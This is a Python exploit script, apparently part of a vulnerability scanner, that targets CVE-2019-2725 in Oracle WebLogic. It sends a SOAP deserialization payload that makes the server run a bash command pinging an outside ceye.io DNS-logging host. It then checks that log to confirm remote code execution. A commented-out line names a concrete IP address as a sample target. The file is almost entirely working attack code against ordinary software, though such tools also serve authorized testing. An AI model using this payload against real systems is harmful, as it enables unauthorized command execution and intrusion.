#coding:utf-8
import sys
import requests
#import random_str
import time
sys.path.insert(0,'../')
from config import random_str
from config import config

def exp_cve_2019_2725(url):
    ceye_dns = config.ceye_dns
    """
    拼接url
    """
    if "://" in url:
        tmp_url = url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/", 1)[1]:
                sign = sign.split("/", 1)[1]
                target_url = tmp_url.split(sign, 1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    else:
        tmp_url = "http://" + url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/", 1)[1]:
                sign = sign.split("/", 1)[1]
                target_url = tmp_url.split(sign, 1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    if ":" in target_url.split("://",1)[1]:
        sign = target_url.split("://",1)[1].split(":",1)[1]
        target_url = target_url.split(sign,1)[0].rstrip(":")
    else:
        target_url = target_url.rstrip("/")
    target_url = target_url + ":7001/_async/AsyncResponseService"
    #print(target_url)   #查看target_url拼接情况
    """
    配置payload
    """
    headers = {"Content-Type": "text/xml; charset=UTF-8", 'Connection': 'close'}
    proxies = config.proxies
    random_s = random_str.random_str()
    payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>ping {0}.vx8u3g.ceye.io</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>""".format(random_s)
    #requests.post(target_url,data=payload,headers=headers,proxies=proxies)
    """
    验证漏洞
    """
    try:
        code = requests.post(target_url, data=payload, headers=headers).status_code
    except:
        print(url + "  不存在CVE-2019-2725漏洞,目标没有开放7001端口")
        return None
    time.sleep(1)
    response = requests.get(ceye_dns).text
    if random_s in response:
        print(url + "  存在CVE-2019-2725漏洞")
    else:
        if code == 202:
            print(url + "  可能存在CVE-2019-2725漏洞,建议使用通杀的payload进行进一步测试")
        else:
            print(url + "  不存在CVE-2019-2725漏洞")


# exp_cve_2019_2725("http://47.106.8.213:7001/console/login/LoginForm.jsp")